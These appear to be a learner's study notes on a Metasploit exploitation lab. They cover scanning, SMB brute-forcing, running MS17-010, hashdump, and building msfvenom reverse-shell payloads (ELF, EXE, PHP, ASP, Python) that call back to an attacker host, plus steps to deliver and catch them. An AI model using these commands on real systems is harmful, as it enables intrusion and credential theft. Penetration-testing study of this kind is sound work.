# Day 29 11tth august 2025

# Metasploit: Exploitation

the topics we will cover are:
How to scan target systems using Metasploit.
How to use the Metasploit database feature.
How to use Metasploit to conduct a vulnerability scan.
How to use Metasploit to exploit vulnerable services on target systems.
How `msfvenom` can be used to create payloads and obtain a Meterpreter session on the target system.

## Scanning

### port scanning

1. `msfconsole` then `search portscan`.
2. `use 5` then `show option`. you can use `info` to know more.


**CONCURRENCY**: Number of targets to be scanned simultaneously.

**PORTS**: Port range to be scanned. Please note that 1-1000 here will not be the same as using Nmap with the default configuration. Nmap will scan the 1000 most used ports, while *Metasploit will scan port numbers from 1 to 10000.*

**RHOSTS**: Target or target network to be scanned.

**THREADS**: Number of threads that will be used simultaneously. *More threads will result in faster scans.*

ALthough it is recommended to use nmaps.

As for information gathering, if your engagement requires a **speedier** approach to port scanning, **Metasploit may not be your first choice.**

### UDP service Identification

1. `search udp scan`. Find udp_sweep option
2. `use <number on which udp_sweep sits on>` e.g. `use 17`
3. `show options` then `set rhost <the target's ip>`.
4.. `run`. 

### namps

Using nmaps in metasploits feel better.
Something like `nmap -sS <target ip>`.
Nmap shall be your first choice and using in metasploits give other benefits like database typeshyt, etc.

### SMB Scans

Especially useful in a corporate network would be `smb_enumshares` and `smb_version`

The **smb_enumshares** module in Metasploit is used to **discover shared folders** (SMB shares) on a target machine running SMB (Server Message Block).

You use smb_enumshares to:
âœ… Find exposed files/folders (like print$ in your scan).
âœ… Discover misconfigurations (e.g., guest-writable shares).
âœ… Plan your next attack (e.g., brute-forcing, uploading malware).


smb_version:
Because knowing the exact Samba/SMB version tells you:

Is the system vulnerable? (e.g., old Samba 3.x â†’ CVE-2007-2447)

What exploits should I try? (e.g., EternalBlue for Windows SMBv1)

Is it worth attacking further? (e.g., up-to-date systems may be harder to exploit)
ðŸ”¹ "Can I pwn this box right now?" (via known exploits)
ðŸ”¹ "Should I waste time brute-forcing?" (if patched)
ðŸ”¹ "Whatâ€™s the best attack path?" (Linux vs. Windows exploits)

NetBIOS (Network Basic Input Output System), similar to SMB, *allows computers to communicate over the network to share files or send files to printers.* 

The NetBIOS name of the target system can give you an idea about its role and even importance (e.g. CORP-DC, DEVOPS, SALES, etc.). 

You may also run across some shared files and folders that could be accessed either without a password or protected with a simple password (e.g. admin, administrator, root, toor, etc.).

### TO GET THE PASS
GIVEN: IP, USERNAME AND WORDLIST

STEPS:
1. We `search smb_login`. We `use smb_login` it
2. `show options`.
3. `set rhost<target's ip>`, `set smb_user <username>` and `set pass_file <wordlist>`.
4.`run` you cracked it!


## The Metasploit Database

Metasploit has a database function to simplify project management and avoid possible confusion when setting up parameter values.

You will first need to start the **PostgreSQL database**, which Metasploit will use with the following command: `systemctl start postgresql.`

Then you will need to **initialize** the Metasploit Database using the `msfdb init` command. 
However, trying to run msfdb init as **root** will give the following **error** message, "Please run msfdb as a non-root user." This can be **solved** by running it as the postgres account using `sudo -u postgres msfdb init.`

`sudo -u postgres msfdb delete` to delete or remove the database.

`db_status` to confirm that you are connected.

we got `workspace` this is to keep stuff organized.
`workspace -a <name>` this let to add that named workspace in the workspace group.
`workspace -d <name>` this is to delete that folder.
`workspace -h` this help.

`help database` will give you every options you can use with database.

Remember earlier using nmaps on metasploit is beneficial. Noww using `db_nmap <what ever you want>` you can keep records of all data.
Next time you run it will be much more quicker than scanning everything again.

You can now reach **information relevant to hosts and services running on target systems** with the `hosts` and `services` commands, respectively. 

Use `host -h` and `service -h` to look into more info.

Once the host information is **stored in the database**, you can use the `hosts -R` command **to add this value to the RHOSTS parameter.**

1. so, `search smb_ms17`  and the `use 0 or whatever the assinged number is`.
2. `hosts -R` will show and set the rhosts automatically. All that are in your database we stored using db_nmap.
3. `run`.

In a *typical penetration testing engagement*, we could have the following scenario: 

Finding available hosts using the db_nmap command
Scanning these for further vulnerabilities or open ports (using a port scanning module) 

The services command used with the -S parameter will allow you to search for specific services in the environment. e.g. `-S netbois`


You may want to **look for low-hanging fruits** such as:

HTTP: Could potentially host a web application where you can find vulnerabilities like SQL injection or Remote Code Execution (RCE).

FTP: Could allow anonymous login and provide access to interesting files.

SMB: Could be vulnerable to SMB exploits like MS17-010

SSH: Could have default or easy to guess credentials

RDP: Could be vulnerable to Bluekeep or allow desktop access if weak credentials were used. 

## Vulnerability Scanning

The term â€œlow hanging fruitâ€ usually refers to **easily** identifiable and exploitable vulnerabilities that could potentially allow you to gain a foothold on a system and, in some cases, gain high-level privileges such as root or administrator.

This rely heavily on your ability to scan and fingerprint the target. 

You can use the `info` command for any module to have a better understanding of its use and purpose.

so `search`, `use`, `info`.

## Exploitation

You can search exploits using the search command, obtain more information about the exploit using the info command, and launch the exploit using exploit/run.

While the process itself is simple, remember that a **successful outcome depends on a thorough understanding** of services running on the target system.

Most of the exploits **will have a preset default payload.**
However, you can always use the `show payloads` command to list other commands you can use with that specific exploit.

Once you have decided on the payload, you can use the `set payload` command to make your choice.

**Note** that choosing a working payload could become a *trial and error process* due to environmental or OS **restrictions** such as firewall rules, anti-virus, file writing, or the program performing the payload execution isn't available (eg. payload/python/shell_reverse_tcp).

Some payloads will open new parameters that you may need to set, running the show options command once more can show these

Once a session is opened, you can **background** it using **CTRL+Z or abort it using CTRL+C.**
Backgrounding a session will be useful when working on more than one target simultaneously or on the same target with a different exploit and/or shell.


### Working with sessions

The sessions command will list all active sessions. 
The sessions command supports a number of options that will help you manage sessions better.

You can interact with any existing session using the sessions -i command followed by the session ID.

create a session and then put it in the vbackground only than you will be able to interact with it.

To navigate through the dictory path use  replace "\" to "/".

Use help to explore all the available options.

Use `hashdump` to know all the hash stored.


## Msfvenom

Msfvenom will allow you to **access all payloads available** in the  Metasploit framework. 
Msfvenom allows you to **create payloads in many different formats** (PHP, exe, dll, elf, etc.) and for many **different target** systems (Apple, Windows, Android, Linux, etc.).

`msfvenom -l payloads` will give you a **list of all available payloads**

### Output formats

You can either generate stand-alone payloads (e.g. a Windows executable for Meterpreter) or get a usable raw format (e.g. python). Themsfvenom --list formats command can be used to list supported output formats

### Encoders

hey encode the payload. 

While it can be effective against some antivirus software, using **modern obfuscation techniques or learning methods to inject shellcode is a better** solution to the problem.

e.g. msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64
BREAKDOWN:
-p is to indicate it is payload
Then then payload
LHOST to define the local host or the attacker.
-f is define format 
raw is the format type
-e to define encode
php/base64 is the encoding type

### Handlers

In baseball we have pitcher and a catcher. Hander is the catcher.
you will need to be able to accept incoming connections generated by the MSFvenom payload. 

When using an exploit module, this part is automatically handled by the exploit module, you will remember how the payload options title appeared when setting a reverse shell. 

The term commonly used to receive a connection from a target is 'catching a shell'. 

Reverse shells or Meterpreter callbacks generated in your MSFvenom payload can be easily caught using a handler.


e.g. # msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php
breakdown:
1. msfvenom invoking the module
2. -p: invoking payload
3. php/reverse_php: the payload
4. LHOST=: defining the local host aka you aka the attacker
5. 10.0.2.19: ip add, it can be anything 
6. LPORT=: 7777 use any port that you machine is not working with and higher ports (10,000â€“65,535). Use 443 for stealthy bend in.
7. -f: invoking formate type
8. > : send it to or relocater
9. reverse_shell.php: the file you want to save the outcome


We will use Multi Handler to **receive the incoming connection**. The module can be used with the use `exploit/multi/handler` command.

To use the module, we will need to set the payload value (php/reverse_php in this case), the LHOST, and LPORT values.
```

msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload php/reverse_php
payload => php/reverse_php
msf5 exploit(multi/handler) > set lhost 10.0.2.19
lhost => 10.0.2.19
msf6 exploit(multi/handler) > set lport 7777
lport => 7777
msf6 exploit(multi/handler) > show options

```

`run`
When the reverse shell is triggered, the connection will be received by multi/handler and provide us with a shell.

If the payload was set as Meterpreter (e.g. in a Windows executable format), multi/handler would then provide us with a Meterpreter shell.

### Other Payloads

Based on the target system's configuration (operating system, install webserver, installed interpreter, etc.), msfvenom can be used to create payloads in almost all formats. Below are a few examples you will often use:

In all these examples, LHOST will be the IP address of your attacking machine, and LPORT will be the port on which your handler will listen.

Linux Executable and Linkable Format (elf)
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
The .elf format is **comparable to the .exe format in Windows**. 
These are executable files for Linux. 
However, you may still need to make sure they have executable permissions on the target machine.

For example, once you have the shell.elf file on your target machine, use the chmod +x shell.elf command to accord executable permissions. Once done, you can run this file by typing ./shell.elf on the target machine command line.

Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe

PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php

ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp

Python
msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py

All of the examples above are reverse payloads. This means **you will need to have the exploit/multi/handler module listening on your attacking machine to work as a handler.**

You will need to set up the handler accordingly with the payload, LHOST and LPORT parameters. These values will be the same you have used when creating the msfvenom payload.



1. made a default payload `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf` replace Xs.

2. used `chmod 777 rev__shell.elf` to give all permission to our .elf

3. open up a python3 -m http.server 9000.

4. In new terminal with ssh with the victim's account.

5. Connect to download the file using `wget http://<victim's ip>/rev_shell`.

6. once downloaded give chmod 777.

7. open msfconsole 

8. `search multi/handler` for getting this ends connection.

9. `show options` then set lhost

10. `run`